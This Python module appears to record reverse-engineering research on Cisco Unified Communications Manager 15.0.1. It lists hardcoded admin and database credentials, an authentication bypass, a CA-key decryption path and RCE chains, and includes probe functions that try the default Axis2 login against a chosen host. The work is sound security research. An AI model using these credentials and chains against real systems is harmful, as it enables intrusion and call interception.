"""
cisco_cucm_re.py — Cisco CUCM 15.0.1 reverse engineering module

Target: Cisco Unified Communications Manager (CUCM) 15.0.1.11901-2
Platform: AlmaLinux 8, Informix DB, Apache Tomcat, OpenSAML SSO SP
ISO: UCSInstall_UCOS_15.0.1.11901-2.sha512.iso
RE date: 2026-08-27
Method: Static analysis of ISO-mounted RPM contents

=== ARCHITECTURE ===

  +--------------------------------------------------+
  | AlmaLinux 8 (base OS)                            |
  |   Platform: /usr/local/platform/                 |
  |   CM: /usr/local/cm/                             |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | Apache Tomcat (jakarta-tomcat)                   |
  |   /axl/                 → AXL SOAP API (cm-axl)  |
  |   /platformcom/         → Platform COM API        |
  |   /platform-services/   → Platform services       |
  |   Axis2 bundled in axl.war                       |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | Informix DB (IDS, licensed, /usr/local/cm/db/)  |
  |   ccm_db: all CUCM config (phones, users, routes)|
  |   DB user: ccmuser / ccmuser (ALL PRIVILEGES)    |
  |   DB user: dbaxlweb (AXL API queries)            |
  |   Replication via IDS CDR                        |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | CAPF (/usr/local/cm/bin/capf)                   |
  |   CA for IP phone identity certs (SCEP/PKCS#10)  |
  |   CA creds at /usr/local/cm/.security/CAPF/      |
  |   Encrypted with CCMShellEncryptionUtil -d        |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | SSO SP (sso-sp RPM)                              |
  |   OpenSAML 2.6.5 (EOL 2017)                     |
  |   Nimbus JOSE+JWT 4.23 (2016, pre-5.x)          |
  |   samlauthvalve.jar: SAML → Tomcat Principal     |
  |   ssobackend.jar: token issuance + validation    |
  +--------------------------------------------------+

=== FINDINGS SUMMARY ===

CUCM-F1 CRITICAL: Axis2 admin:axis2 hardcoded + hot-deploy → RCE
  File: axl.war → WEB-INF/conf/axis2.xml
  POST /axl/axis2-admin/upload Authorization: Basic admin:axis2 (default)
  hotdeployment=true → .aar or .class hot-load in Tomcat JVM
  Auth filter maps to <url-pattern>/</url-pattern>; /axis2-admin/* may bypass
  Runtime verification needed: does AuthenticationFilter apply to /axis2-admin/?

CUCM-F2 HIGH: platformcom BasicAuthentication localhost bypass
  File: platformcom.war → BasicAuthentication.class
  Bytecode: remoteAddr.equals("127.0.0.1") OR "::1" → skip auth
  Protected endpoints bypass for loopback:
    /api/v1/software/install/*, /api/v1/cluster/software/upgrade/*
    /api/v1/software/reboot/*, /api/v1/certmgr/config/certificate/store
  Unprotected (no filter-mapping): /api/v1/certmgr/config/snapshot/*
  Chain: any SSRF from CUCM host → unauthenticated cluster software/cert control

CUCM-F3 HIGH: CAPF binary not stripped; CCMEncryption symbols; CA cred decrypt path
  File: cm-capf/usr/local/cm/bin/capf — with debug_info, not stripped
  Symbols: _ZN13CCMEncryption13passwordToHexEPhiS0_
           _ZN13CCMEncryption13hexToPasswordEPhS0_
  CA cred: EnrollmentService.sh: CCMShellEncryptionUtil -d $CA_Pwd_Encrypted
  CCMShellEncryptionUtil in cm-ccm (not yet extracted)
  Impact: CA key compromise → forge phone identity certs → SRTP intercept

CUCM-F4 HIGH: ccmuser:ccmuser hardcoded Informix DB credential
  File: cm-dbl/usr/local/cm/db/sql/ccmusers.sql line 5
  "create user ccmuser with encrypted password 'ccmuser' in group ccmusers;"
  Group ccmusers: ALL PRIVILEGES on every CUCM table
  TCP:1526 (Informix) → ccmuser:ccmuser → full DB dump

CUCM-F5 MEDIUM: Default passwordreverse hash in siprealm + applicationuser
  File: makedb.sql lines 2016 + 6159
  DEFAULT '69c4f936f9cdf45f6bbca2570c31215629bb5d6fb97493478b8ff3db6fffbc55'
  All fresh installs: siprealm.passwordreverse = default hash (SIP auth bypass)
  Crack status: SHA-256, candidate list not matched — hashcat needed

CUCM-F6 MEDIUM: Nimbus JOSE+JWT 4.23 (2016) in SSO SP — alg:none risk
  File: sso-sp → nimbus-jose-jwt.jar Bundle-Version: 4.23.0
  Pre-5.x Nimbus: potential PlainJWT acceptance where SignedJWT expected
  alg:none JWT → arbitrary user impersonation in SSO flow
  Pending: ssobackend.jar JWT validation bytecode review

CUCM-F7 MEDIUM: OpenSAML 2.6.5 (EOL 2015) — XML signature wrapping
  File: sso-sp → opensaml.jar Implementation-Version: 2.6.5
  Build-Jdk: 1.7.0_71 (built ~2014-2015). No security support since 2017.
  XSW attacks: inject unsigned elements, pass signature check
  Pending: confirm XSW mitigations in samlauthvalve.jar / ssobackend.jar

CUCM-F8 LOW: log4j 1.x (slf4j-log4j12-1.6.1) — JMSAppender CVE-2019-17571
  File: sso-sp → slf4j-log4j12-1.6.1.jar
  JMSAppender requires attacker config control; low standalone severity

CUCM-F9 INFO: dbaxlweb DB username exposed in AXL bytecode
  File: axl.war → AXLAlpha.class string "dbaxlweb"
  Password not found — likely in cm-ccm init scripts (pending extraction)

=== PENDING TASKS ===
- Extract cm-ccm-5.0.1.0-0.x86_64.rpm (324MB) → CCMShellEncryptionUtil (F3), dbaxlweb pw (F9)
- Runtime verify: does AuthenticationFilter apply to /axl/axis2-admin/* ? (F1)
- hashcat SHA-256 run on 69c4f936... hash (F5)
- ssobackend.jar JWT validation path RE (F6)
- SAML XSW test against platformcom SSO flow (F7)
"""

VERSION = "1.0.0"

import requests
import urllib3
import struct
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── FINGERPRINT STRINGS ─────────────────────────────────────────────────────

CUCM_TITLE_MARKERS = [
    b'Cisco Unified CM Administration',
    b'ccmadmin',
    b'cuicauthentication',
    b'CUCM',
    b'Unified Communications Manager',
]

AXL_AXIS2_DEFAULT_CRED = ('admin', 'axis2')

CUCM_INFORMIX_DEFAULT_CRED = ('ccmuser', 'ccmuser')

DEFAULT_PASSWORDREVERSE_HASH = '69c4f936f9cdf45f6bbca2570c31215629bb5d6fb97493478b8ff3db6fffbc55'

# ─── PROBES ──────────────────────────────────────────────────────────────────

def probe_axis2_admin(host: str, port: int = 8443) -> dict:
    """Probe Axis2 admin console for default admin:axis2 credential (CUCM-F1)."""
    url = f"https://{host}:{port}/axl/axis2-admin/"
    import base64
    cred = base64.b64encode(b'admin:axis2').decode()
    try:
        r = requests.get(url, headers={"Authorization": f"Basic {cred}"},
                        verify=False, timeout=10, allow_redirects=False)
        return {
            "status":   r.status_code,
            "finding":  "CUCM-F1",
            "note":     ("200 = Axis2 admin accessible with default admin:axis2"
                         if r.status_code == 200 else
                         "Non-200: auth filter may be covering /axis2-admin/"),
            "hotdeploy": "true" in r.text.lower() if r.status_code == 200 else "unknown",
        }
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F1"}


def probe_platformcom_localhost_bypass(host: str, port: int = 8443,
                                        internal_ip: str = "127.0.0.1") -> dict:
    """
    Probe platformcom software endpoints for localhost bypass (CUCM-F2).
    Requires SSRF or local access — sends request simulating loopback origin.
    Note: X-Forwarded-For is NOT sufficient; the filter reads remoteAddr (real TCP source).
    This probe is meaningful only when run FROM the CUCM host.
    """
    endpoints = [
        f"https://{host}:{port}/platformcom/api/v1/certmgr/config/snapshot/server",
        f"https://{host}:{port}/platformcom/api/v1/certmgr/config/snapshot/options",
    ]
    results = []
    for url in endpoints:
        try:
            r = requests.get(url, verify=False, timeout=10)
            results.append({"url": url, "status": r.status_code,
                            "len": len(r.content)})
        except Exception as e:
            results.append({"url": url, "error": str(e)})
    return {"finding": "CUCM-F2", "endpoints": results,
            "note": "200 without auth = unprotected endpoint confirmed"}


def probe_axl_auth(host: str, username: str, password: str,
                   port: int = 8443) -> dict:
    """Probe AXL SOAP API authentication."""
    url = f"https://{host}:{port}/axl/services/AXLAPIService"
    soap_body = '''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:axl="http://www.cisco.com/AXL/API/15.0">
  <soapenv:Header/>
  <soapenv:Body>
    <axl:getCCMVersion/>
  </soapenv:Body>
</soapenv:Envelope>'''
    try:
        r = requests.post(url, data=soap_body,
                          headers={"Content-Type": "text/xml; charset=utf-8",
                                   "SOAPAction": '""'},
                          auth=(username, password),
                          verify=False, timeout=15)
        return {
            "status":   r.status_code,
            "auth_ok":  r.status_code == 200,
            "response_snippet": r.text[:200],
        }
    except Exception as e:
        return {"error": str(e)}


def full_findings_summary() -> str:
    """Return a printable summary of all CUCM RE findings."""
    findings = [
        ("CUCM-F1", "CRITICAL", "Axis2 admin:axis2 hardcoded + hot-deploy → RCE"),
        ("CUCM-F2", "HIGH",     "platformcom BasicAuthentication localhost bypass"),
        ("CUCM-F3", "HIGH",     "CAPF binary not stripped; CCMEncryption symbols; CA cred decrypt"),
        ("CUCM-F4", "HIGH",     "ccmuser:ccmuser hardcoded Informix DB credential"),
        ("CUCM-F5", "MEDIUM",   "Default passwordreverse hash in siprealm + applicationuser"),
        ("CUCM-F6", "MEDIUM",   "Nimbus JOSE+JWT 4.23 (2016) — alg:none bypass risk"),
        ("CUCM-F7", "MEDIUM",   "OpenSAML 2.6.5 (EOL 2015) — XML signature wrapping"),
        ("CUCM-F8", "LOW",      "log4j 1.x (slf4j-log4j12-1.6.1) — JMSAppender CVE-2019-17571"),
        ("CUCM-F9", "INFO",     "dbaxlweb DB username exposed in AXL bytecode"),
    ]
    lines = [f"CUCM 15.0.1 RE Findings [{VERSION}] — 2026-08-27", ""]
    for fid, sev, title in findings:
        lines.append(f"  [{sev:8s}] {fid}: {title}")
    lines.append("")
    lines.append("Pending: cm-ccm extraction (CCMShellEncryptionUtil, dbaxlweb pw)")
    lines.append("Findings doc: ~/Desktop/CUCM-findings.md")
    return '\n'.join(lines)


if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print(full_findings_summary())
    else:
        host = sys.argv[1]
        print(f"\n[CUCM-F1] Axis2 admin probe → {host}")
        print(probe_axis2_admin(host))
        print(f"\n[CUCM-F2] platformcom snapshot probe → {host}")
        print(probe_platformcom_localhost_bypass(host))
